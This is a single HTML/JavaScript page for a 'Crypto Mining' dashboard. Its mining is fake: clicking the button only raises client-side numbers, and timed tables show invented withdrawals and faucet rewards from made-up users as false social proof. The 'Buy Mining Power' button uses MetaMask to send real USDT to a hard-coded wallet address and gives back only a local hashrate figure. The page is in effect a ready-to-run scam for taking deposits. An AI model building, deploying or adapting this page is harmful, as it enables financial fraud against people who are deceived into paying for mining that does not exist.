<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Crypto Mining</title>
<link rel="icon" href="https://cryptologos.cc/logos/bitcoin-btc-logo.png" type="image/png">
<style>
  body { font-family: Arial, sans-serif; margin:0; padding:0; background:#f4f4f4; }
  header { background:#222; color:#fff; padding:10px 20px; display:flex; justify-content:space-between; align-items:center; }
  header h1 { margin:0; font-size:1.5em; }
  nav a { color:#fff; margin-left:15px; text-decoration:none; }
  #loginModal, #dashboard { display:none; }
  .modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.6); display:flex; justify-content:center; align-items:center; }
  .modal-content { background:#fff; padding:20px; border-radius:8px; width:300px; text-align:center; }
  input[type=email], button { width:100%; padding:10px; margin:5px 0; border-radius:5px; border:1px solid #ccc; }
  button { cursor:pointer; background:#28a745; color:#fff; border:none; }
  table { width:100%; border-collapse:collapse; margin-top:10px; background:#fff; }
  th, td { padding:8px; text-align:center; border:1px solid #ddd; }
  th { background:#222; color:#fff; }
  .coin-select { margin-top:10px; }
  .balance-row { display:flex; justify-content:space-between; margin:5px 0; padding:5px 10px; background:#fff; border-radius:5px; }
</style>
</head>
<body>

<header>
  <h1>Crypto Mining</h1>
  <nav>
    <a href="#" id="loginBtn">Login</a>
    <a href="#" id="logoutBtn" style="display:none;">Logout</a>
  </nav>
</header>

<!-- Login Modal -->
<div class="modal" id="loginModal">
  <div class="modal-content">
    <h2>Login</h2>
    <input type="email" id="emailInput" placeholder="Enter email">
    <button id="modalLogin">Login</button>
  </div>
</div>

<!-- Dashboard -->
<div id="dashboard" style="padding:20px;">
  <h2>ðŸ”¥ Dashboard</h2>
  <p>Hi, <span id="userEmail"></span></p>
  <p>Your Hashrate: <span id="userHashrate">5.00</span> H/s</p>
  <p>Your Balance: <span id="userBalance">0.00</span> USD</p>
  <p>Current Rate: 0.35%</p>
  <button id="connectWallet">Connect MetaMask</button>
  <p id="walletAddress"></p>

  <div class="coin-select">
    <label>Select coin to mine:</label>
    <select id="coinSelect">
      <option value="BTC">Bitcoin</option>
      <option value="ETH">Ethereum</option>
      <option value="BNB">BNB</option>
      <option value="LTC">Litecoin</option>
      <option value="DOGE">Dogecoin</option>
    </select>
    <button id="mineBtn">Start Mining</button>
  </div>

  <h3>Balances</h3>
  <div id="coinBalances">
    <!-- balance rows inserted here -->
  </div>

  <h3>Transaction Simulation</h3>
  <table id="txTable">
    <thead>
      <tr><th>User</th><th>Type</th><th>Amount</th><th>TX ID</th><th>Time</th></tr>
    </thead>
    <tbody id="txBody"></tbody>
  </table>

  <h3>Faucet Simulation</h3>
  <table id="faucetTable">
    <thead>
      <tr><th>User</th><th>Reward</th><th>Time</th></tr>
    </thead>
    <tbody id="faucetBody"></tbody>
  </table>

  <button id="claimBtn">Claim 1 H/s</button>
  <button id="buyUSDTBtn">Buy Mining Power (USDT)</button>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
<script>
/* ---------- User Login ---------- */
let currentUser = null;
const loginBtn = document.getElementById('loginBtn');
const logoutBtn = document.getElementById('logoutBtn');
const loginModal = document.getElementById('loginModal');
const emailInput = document.getElementById('emailInput');
const modalLogin = document.getElementById('modalLogin');
const dashboard = document.getElementById('dashboard');
const userEmailSpan = document.getElementById('userEmail');

loginBtn.addEventListener('click', ()=>{ loginModal.style.display='flex'; });
logoutBtn.addEventListener('click', ()=>{
  currentUser=null;
  dashboard.style.display='none';
  loginBtn.style.display='inline';
  logoutBtn.style.display='none';
});

modalLogin.addEventListener('click', ()=>{
  const email = emailInput.value.trim();
  if(!email){ alert('Enter email'); return; }
  currentUser = { email };
  loginModal.style.display='none';
  dashboard.style.display='block';
  loginBtn.style.display='none';
  logoutBtn.style.display='inline';
  userEmailSpan.textContent = email;
  loadUserData(email);
});

/* ---------- Load Old User Data ---------- */
const usersData = {}; // lÆ°u data theo email cÅ©
const coins = ["BTC","ETH","BNB","LTC","DOGE"];
function loadUserData(email){
  if(!usersData[email]){
    usersData[email] = {
      hashrate:5.0,
      balance:0.0,
      coins: { BTC:0, ETH:0, BNB:0, LTC:0, DOGE:0 }
    };
  }
  document.getElementById('userHashrate').textContent = usersData[email].hashrate.toFixed(2);
  document.getElementById('userBalance').textContent = usersData[email].balance.toFixed(2);
  renderCoinBalances(email);
}

function renderCoinBalances(email){
  const container = document.getElementById('coinBalances');
  container.innerHTML='';
  const data = usersData[email].coins;
  coins.forEach(c=>{
    const div = document.createElement('div');
    div.className='balance-row';
    div.innerHTML=`<span>${c}</span><span>${data[c].toFixed(8)}</span>`;
    container.appendChild(div);
  });
}

/* ---------- Transaction / Faucet Simulation ---------- */
const txBody = document.getElementById('txBody');
const faucetBody = document.getElementById('faucetBody');
const claimBtn = document.getElementById('claimBtn');
const names = ["alice","bob","carol","dave","eve"];
function pick(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
function rand(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
function timeLabel(){ return new Date().toLocaleTimeString(); }
function genTxId(len){ const chars='0123456789abcdef'; let s=''; for(let i=0;i<len;i++) s+=chars[Math.floor(Math.random()*chars.length)]; return s; }
function formatAmount(){ return (Math.random()*0.001).toFixed(8); }

function createTxRow({user,type,amount,tx,time}){
  const tr = document.createElement('tr');
  tr.innerHTML = `<td>${user}</td><td>${type}</td><td>${amount}</td><td>${tx}</td><td>${time}</td>`;
  return tr;
}

function createFaucetRow({user,reward,time}){
  const tr = document.createElement('tr');
  tr.innerHTML = `<td>${user}</td><td>${reward}</td><td>${time}</td>`;
  return tr;
}

function pushTx(){ const row={user:pick(names),type:'WITHDRAW',amount:formatAmount(),tx:genTxId(8)+'...'+genTxId(4),time:timeLabel()}; txBody.insertBefore(createTxRow(row),txBody.firstChild); while(txBody.children.length>50) txBody.removeChild(txBody.lastChild);}
function pushFaucet(userOverride=null,rewardOverride=null){
  const user = userOverride || pick(names);
  const reward = rewardOverride || (rand(1,5)+'.0 H/s');
  const row = {user,reward,time:timeLabel()};
  faucetBody.insertBefore(createFaucetRow(row),faucetBody.firstChild);
  while(faucetBody.children.length>50) faucetBody.removeChild(faucetBody.lastChild);
}

setInterval(pushTx,3000);
setInterval(()=>pushFaucet(),5000);

claimBtn.addEventListener('click', ()=>{
  if(!currentUser){ alert('Login first'); return; }
  pushFaucet(currentUser.email,'1.0 H/s');
});

/* ---------- Coin Mining ---------- */
document.getElementById('mineBtn').addEventListener('click', ()=>{
  if(!currentUser){ alert('Login first'); return; }
  const coin = document.getElementById('coinSelect').value;
  const userData = usersData[currentUser.email];
  userData.coins[coin] += 0.000001;
  userData.balance += 0.00001;
  renderCoinBalances(currentUser.email);
  document.getElementById('userBalance').textContent = userData.balance.toFixed(8);
  alert(`Mining ${coin}... Your Hashrate: ${userData.hashrate.toFixed(2)} H/s`);
});

/* ---------- MetaMask / USDT ---------- */
const connectWalletBtn = document.getElementById('connectWallet');
const walletAddressP = document.getElementById('walletAddress');
let web3, userAccount;

async function connectWallet(){
  if(window.ethereum){
    web3 = new Web3(window.ethereum);
    try{
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      userAccount = accounts[0];
      walletAddressP.textContent = 'Wallet: '+userAccount;
    } catch(err){ alert('User rejected'); }
  } else alert('MetaMask not found');
}

connectWalletBtn.addEventListener('click', connectWallet);

/* ---------- Buy USDT / Increase Hashrate ---------- */
document.getElementById('buyUSDTBtn').addEventListener('click', async ()=>{
  if(!userAccount){ alert('Connect MetaMask first'); return; }
  const amount = prompt('Enter USDT amount to buy mining power:');
  if(!amount || isNaN(amount)) return;
  const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; 
  const toAddress = "0xeC50a1f60571B10AD6840e0841d439a4F5cDD80c"; 
  const contract = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}], usdtAddress);
  try{
    const tx = await contract.methods.transfer(toAddress, web3.utils.toWei(amount,'mwei')).send({from:userAccount});
    alert('Transaction sent: '+tx.transactionHash);
    if(currentUser){
      usersData[currentUser.email].hashrate += parseFloat(amount)*2; 
      document.getElementById('userHashrate').textContent = usersData[currentUser.email].hashrate.toFixed(2);
    }
  }catch(e){ alert('Transaction failed'); }
});
</script>

</body>
</html>
